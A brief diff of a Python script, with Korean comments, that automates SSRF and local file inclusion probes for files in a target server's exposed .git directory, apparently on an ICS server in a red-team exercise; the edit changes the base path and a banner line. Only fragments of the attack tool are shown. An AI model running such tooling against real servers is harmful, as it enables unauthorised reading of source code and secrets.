@@ -13,7 +13,7 @@ from config import TARGET_URL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # 대상 서버에 존재하는 .git 디렉토리의 기본 경로
-GIT_BASE_PATH = "/home/bteam/Desktop/_CPSS_ICS_Server/.git"
+GIT_BASE_PATH = "/soap/home/bteam/Desktop/_CPSS_ICS_Server/.git"
 
 # .git 디렉토리 내에서 확인할 파일 및 하위 디렉토리의 포괄적인 목록
 paths_to_check = [
@@ -55,7 +55,7 @@ paths_to_check = [
 ]
 
 
-print("========== SSRF + LFI 자동화 시작 (div 기반) ==========\n")
+print("========== SSRF + LFI 자동화 시작 (div 기반) ==========")
 
 for p in paths_to_check:
     # 전체 파일 경로 조합
